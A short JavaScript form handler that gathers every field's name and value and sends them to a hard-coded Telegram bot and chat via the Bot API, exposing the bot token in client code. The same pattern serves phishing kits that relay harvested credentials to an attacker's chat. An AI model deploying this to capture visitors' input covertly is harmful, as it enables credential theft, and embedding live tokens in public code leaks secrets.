const success = document.querySelector('.success');
const form = document.querySelector('form');
const submit = document.querySelector('form button');

submit.addEventListener('click', function(e) {
  e.preventDefault();
  let message = '';
  [...form.elements].forEach(elem => {
    if(elem.nodeName != 'BUTTON') {
      message += `${elem.name}: ${elem.value} \n`;
    }
  });
  fetch(encodeURI(`https://api.telegram.org/bot5467005733:AAFsGUoPRjNmZf_qNzPqEr4H1GE9nu53Wug/sendMessage?chat_id=2021259438&text=${message}`))
  .then(data => data.json())
  .then(data => {
    success.classList.add('show');
  })
});